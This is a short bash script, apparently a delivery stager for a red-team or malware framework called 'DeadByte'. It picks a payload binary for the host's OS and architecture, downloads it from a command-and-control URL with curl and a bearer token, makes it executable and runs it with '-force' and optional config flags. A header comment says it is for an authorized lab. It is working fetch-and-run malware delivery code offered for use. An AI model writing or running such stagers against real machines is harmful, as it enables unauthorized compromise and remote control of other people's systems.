#!/usr/bin/env bash
# DeadByte - delivery template for Linux/macOS (shell).
# Use in an authorized lab:
#   C2_URL=http://192.0.2.10:8443 BLOB="<blob from -config-gen>" ./run.sh
set -euo pipefail
C2_URL="${C2_URL:-http://127.0.0.1:8443}"
ADMIN_TOKEN="${ADMIN_TOKEN:-change-me-admin-token}"
BLOB="${BLOB:-}"
LOG_FILE="${LOG_FILE:-/tmp/deadbyte.log}"
NO_FORCE="${NO_FORCE:-0}"   # NO_FORCE=1 only on a NON-elevated machine / outside a VM
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
case "$(uname -s)-$(uname -m)" in
	Linux-x86_64|Linux-amd64)  BIN="deadbyte-payload-linux-amd64" ;;
	Linux-aarch64|Linux-arm64) BIN="deadbyte-payload-linux-arm64" ;;
	Darwin-x86_64)             BIN="deadbyte-payload-darwin-amd64" ;;
	Darwin-arm64)              BIN="deadbyte-payload-darwin-arm64" ;;
	*) echo "unsupported platform: $(uname -s)-$(uname -m)" >&2; exit 1 ;;
esac
curl -fsSL -H "Authorization: Bearer $ADMIN_TOKEN" -o "$TMP/p" "$C2_URL/artifacts/$BIN"
chmod +x "$TMP/p"
ARGS=(-force -verbose -log-file "$LOG_FILE")
if [ "$NO_FORCE" = "1" ]; then
	ARGS=(-verbose -log-file "$LOG_FILE")
fi
if [ -n "$BLOB" ]; then
	ARGS=(-config "$BLOB" "${ARGS[@]}")
fi
echo "Starting payload. Follow the log: $LOG_FILE"
"$TMP/p" "${ARGS[@]}"
